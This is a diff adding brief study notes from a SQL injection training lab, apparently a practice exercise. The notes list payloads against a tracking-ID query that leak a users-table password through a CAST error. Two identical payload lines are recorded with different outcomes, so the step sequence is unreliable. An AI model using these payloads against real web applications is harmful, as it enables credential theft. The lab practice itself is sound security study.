@@ -1,0 +1,17 @@
+Lab #18 - Visible error-based SQL injection
+
+End Goal : Exploit SQL injection to retrieve the admin user's credentials from the users
+table and log into thier account.
+
+Analysis:
+
+SELECT * FROM tracking WHERE id = 'EKVDv4VdNqitYN4v''  -> this gives error
+
+EKVDv4VdNqitYN4v' and (select 1)=1--  --> no error, means next step forward
+
+' and CAST((select password from users LIMIT 1) as int)=1--   ->> no error, next step
+
+' and CAST((select password from users LIMIT 1) as int)=1--   --> no error, got password
+
+We leak password in ui of web app, this is how it works
+Not scripting , only fuzzing
